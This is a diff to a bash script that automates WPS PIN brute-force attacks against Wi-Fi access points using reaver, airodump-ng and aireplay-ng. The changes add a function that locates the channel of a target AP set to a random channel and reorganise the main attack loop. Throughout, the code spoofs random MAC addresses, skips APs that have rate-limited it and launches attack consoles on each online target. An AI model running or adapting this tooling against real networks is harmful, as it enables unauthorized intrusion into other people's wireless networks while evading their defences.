@@ -267,6 +267,7 @@ echoBlue(){
 # using: isAPOnline AA:BB:CC:DD:EE:FF 3
 # BSSID and CHANNEL are important parameters, because airodump doesn't need to output all networks into it's log
 # and also it's much much faster to connect to known BSSID and CHANNEL (it doesn't need to jump between channels)
+# it gets timeout from global BSSID_ONLINE_TIMEOUT
 isAPOnline(){
   #local CHECK=$(iwlist wlan0 scan | grep "$1");
   if [[ -z $(ifconfig | grep "mon0") ]]; then
@@ -303,16 +304,47 @@ isAPOnline(){
       fi
   done
 }
+
+# it gets timeout from global BSSID_ONLINE_TIMEOUT
+findAPChannel(){
+  if [[ -z $(ifconfig | grep "mon0") ]]; then
+    airmon-ng start $WIRELESS_INTERFACE;
+  fi
+  local BSSID=$1;
+  local TMP_LOG="$TMP_DIR/findAPChannel";
+  local AIRODUMP_CSV_LOG=$TMP_LOG"-01.csv";
+  local BEGIN_TIME=$(date +%s);
+   # clear old logs
+  rm $AIRODUMP_CSV_LOG 2>/dev/null;
+  nohup airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID mon0 &> /dev/null &
+  #airodump-ng --bssid 08:60:6E:EE:72:D0 mon0 2>&1 | awk '{ if(/08:60:6E:EE:72:D0/){ print $6;} }'
+  local LAST_PID=$!;
+  while true; do
+      # re-check airodump-ng log after X seconds
+      sleep 3;
+      local CHANNEL=$(cat $AIRODUMP_CSV_LOG | awk -F', ' '{ if(/'$BSSID'/){ print $4;} }');
+      # if channel was found
+      if [[ -n "$CHANNEL" ]]; then
+	  kill $LAST_PID;
+	  rm $AIRODUMP_CSV_LOG 2>/dev/null;
+	  echo $CHANNEL;
+	  return $CHANNEL;
+      fi
+      # if we reached timeout we have to end with failure
+      if [[ $[$BEGIN_TIME+$BSSID_ONLINE_TIMEOUT] < $[$(date +%s)] ]]; then
+	  kill $LAST_PID;
+	  rm $AIRODUMP_CSV_LOG 2>/dev/null;
+	  echo 0;
+	  return 0;
+      fi
+  done
+}
 ########### END OF FUNCTIONS #######################################################
 # check logged user
 if [[ $(whoami) != 'root' ]]; then
    echoBlue "You have to be logged as root, otherwise some commands may not work";
    exit;
 fi
-
-
-
-
 
 if [[ $[$INACTIVITY_TIMEOUT] > 0 ]]; then
     makeActivityChecker;  
@@ -351,39 +383,12 @@ while true; do
 	 echoBlue "Skipping...";
 	 continue;
       fi
+
+      ############# VARIABLES INITIALIZATION ################
       BSSID=$(echo "$TARGET" | gawk -F' ' '{print $1}');
       CHANNEL=$(echo "$TARGET" | gawk -F' ' '{print $2}');
       ESSID=$(echo "$TARGET" | gawk -F' ' '{printf "%s",$3; if(NF>3){ for(i=4;i<=NF;i++){ printf " %s",$i; } }  }');
       BSSID_CLEAR=$(echo $BSSID | sed s/://g);
-      if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
-	  echoBlue "Error one of variables.. BSSID=$BSSID, CHANNEL=$CHANNEL is empty";
-	  continue;
-      fi
-      # include specific AP settings if file exists
-      if [[ -f "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR" ]]; then
-          echoBlue "I've included specific settings for '$ESSID' from file $(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
-	  source "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
-      # but we have to include default configurationSettings again for another APs
-      # to prevent overwriting of default setting by one AP to all APs
-      else 
-	  source "$(pwd)/configurationSettings";
-      fi
-      # here we generate random mac address (containing only numbers 0-9)
-      # first octets should be 02 as most Wireless Cards have
-      if [[ -z "$SPOOFED_MAC" ]]; then
-	      MAC=$(perl -e 'sub l{":".int(rand(9)).int(rand(9));}; print "02".l.l.l.l.l;');
-	      changeMacTo $MAC;
-      fi
-      # check if mac was changed - if so - proceed with macchanger
-      if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
-	      MAC=$SPOOFED_MAC;
-	      changeMacTo $SPOOFED_MAC;
-      fi
-      # sleep between APs
-      if [[ $[$SLEEP_BETWEEN_APS] > 0 ]]; then
-	echoBlue "Sleeping between AP's for $SLEEP_BETWEEN_APS seconds....";
-	sleep $SLEEP_BETWEEN_APS;
-      fi
       # session file names are generated from AP MAC: /usr/local/etc/reaver/C8600071B254.wpc
       # if you encounter problem with this directory just search for reaver session directory and change following line
       SESSIONFILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.wpc';
@@ -394,8 +399,40 @@ while true; do
       if [[ -z "$ESSID" ]]; then 
 	 ESSID="<EMPTY>";
       fi
-     
+      
+      ############ CHECK FOR EMTPY CHANNEL OR BSSID ###############
+      if [[ -z "$BSSID" || -z "$CHANNEL" ]]; then
+	  echoBlue "Error one of variables.. BSSID=$BSSID, CHANNEL=$CHANNEL is empty";
+	  continue;
+      fi
+
+      ############ INCLUDE SPECIFIC SETTINGS PER ACCESS POINT ###################
+      if [[ -f "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR" ]]; then
+          echoBlue "I've included specific settings for '$ESSID' from file $(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
+	  source "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
+      # but we have to include default configurationSettings again for another APs
+      # to prevent overwriting of default setting by one AP to all APs
+      else 
+	  source "$(pwd)/configurationSettings";
+      fi
+
+      ########## SLEEP BETWEEN APS ###############
+      if [[ $[$SLEEP_BETWEEN_APS] > 0 ]]; then
+	echoBlue "Sleeping between AP's for $SLEEP_BETWEEN_APS seconds....";
+	sleep $SLEEP_BETWEEN_APS;
+      fi
+
       echoBlue "Checking: BSSID=$BSSID, CHANNEL=$CHANNEL, ESSID=$ESSID ";
+
+      ######### CHECK IF AP WAS BLOCKED #######
+      # if file indicating AP rate limit exists, and if it was modified less than LIMIT_WAIT_MINUTES minutes
+      # if so.. than BSSID is skipped 
+      if [[ ! -z $(find ${LIMIT_TMP_DIR}/ -type f -name ${BSSID_CLEAR} -mmin -${LIMIT_WAIT_MINUTES}) ]]; then
+	  echoBlue "$BSSID ($ESSID) was blocked less than $LIMIT_WAIT_MINUTES minutes ago, skipping";
+	  continue;
+      fi
+
+      ######## SHOW AVERAGE TIME BETWEEN PINS AND CHECK PINS NUM
       if [[ -f $BSSID_LAST_PIN_DATE_FILE ]]; then
 	  AVG_SECONDS=$(countAVGSecondsBetweenDates $BSSID_LAST_PIN_DATE_FILE);
 	  if [[ ! -z $AVG_SECONDS ]]; then
@@ -405,21 +442,42 @@ while true; do
       if [[ -f $SESSIONFILE ]]; then
 	  echoBlue "I found  "$(head -1 $SESSIONFILE)"  checked PINs in session file";
       fi
-      # here we check if rate limit was reached and, and check 
-      # if file indicating AP rate limit exists, and if it was modified less than LIMIT_WAIT_MINUTES minutes
-      # if so.. than BSSID is skipped 
-      if [[ ! -z $(find ${LIMIT_TMP_DIR}/ -type f -name ${BSSID_CLEAR} -mmin -${LIMIT_WAIT_MINUTES}) ]]; then
-	  echoBlue "$BSSID ($ESSID) was blocked less than $LIMIT_WAIT_MINUTES minutes ago, skipping";
-	  continue;
-      fi
+
+      ######## SCAN TO CHECK IF AP IS ONLINE #########
       echoBlue "Wait $BSSID_ONLINE_TIMEOUT seconds... scanning if $BSSID ($ESSID) is online";
-      if [[ $(isAPOnline $BSSID $CHANNEL) == 1 ]]; then
-	echoBlue "$BSSID ($ESSID) IS ONLINE!!! Proceed attack!!!!";
+      # in case that channel is random we have to discover it (but it takes longer time since airodump-ng must hopping between channels)
+      if [[ $CHANNEL == "R" ]]; then
+		echoBlue "Searching for channel....";
+		CHANNEL=$(findAPChannel $BSSID);
+		if [[ $CHANNEL != 0 ]]; then
+		    echoBlue "$BSSID IS ONLINE!!! Currently it has CHANNEL  $CHANNEL  Proceeed attack!!!";
+		else 
+		    echoBlue "$BSSID ($ESSID) is OFFLINE (couldn't find channel).. skipping to another...";
+		    continue;
+		fi
       else 
-	echoBlue "$BSSID ($ESSID) is OFFLINE.. skipping to another...";
-	continue;
+	        if [[ $(isAPOnline $BSSID $CHANNEL) == 1 ]]; then
+		    echoBlue "$BSSID ($ESSID) IS ONLINE!!! Proceed attack!!!";
+		else 
+		    echoBlue "$BSSID ($ESSID) is OFFLINE.. skipping to another...";
+		    continue;
+		fi
       fi
 
+
+      ######### CHANGE MAC IF SPOOFED ########
+      # here we generate random mac address (containing only numbers 0-9)
+      # first octets should be 02 as most Wireless Cards have
+      if [[ -z "$SPOOFED_MAC" ]]; then
+	      MAC=$(perl -e 'sub l{":".int(rand(9)).int(rand(9));}; print "02".l.l.l.l.l;');
+	      changeMacTo $MAC;
+      fi
+      if [ ! -z "$SPOOFED_MAC" ] && [ "$MAC" != "$SPOOFED_MAC" ]; then
+	      MAC=$SPOOFED_MAC;
+	      changeMacTo $SPOOFED_MAC;
+      fi
+
+      ############# START KONSOLE COMMANDS WITH: REAVER && R.A.C. && AIREPLAY && AIRODUMP
       # start monitoring BSSID & show blocked WPS in other konsole windows
       CM="konsole --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --bssid=$BSSID --channel=$CHANNEL mon0' ";
       echoGreen "$CM" && eval $CM 2>/dev/null
@@ -472,6 +530,8 @@ while true; do
       kill -INT $(getKonsolePidByProcessName 'airodump-ng') 2>/dev/null;
       kill -INT $(getKonsolePidByProcessName 'aireplay-ng') 2>/dev/null;
     done
+
+    ########## SLEEP AFTER LIST RECHECK #################
     if [[ $[$SLEEP_BEFORE_LIST_RECHECK] > 0 ]]; then
       echoBlue "Sleeping before another list re-check for $SLEEP_BEFORE_LIST_RECHECK seconds....";
       echoBlue ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>";
